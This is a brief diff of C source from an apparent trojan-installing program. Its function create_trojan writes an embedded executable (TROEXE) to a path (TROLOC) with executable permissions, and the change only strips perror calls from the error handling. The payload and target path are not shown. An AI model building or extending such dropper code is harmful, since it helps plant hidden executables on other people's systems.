@@ -10,14 +10,10 @@ int	create_trojan(void)
 
 	fd = creat(TROLOC, 0755);
 	if (fd < 0)
-	{
-		perror("open");
 		return (EXIT_FAILURE);
-	}
 	if (write(fd, TROEXE, sizeof(TROEXE)) < 0)
 	{
 		close(fd);
-		perror("open");
 		return (EXIT_FAILURE);
 	}
 	close(fd);
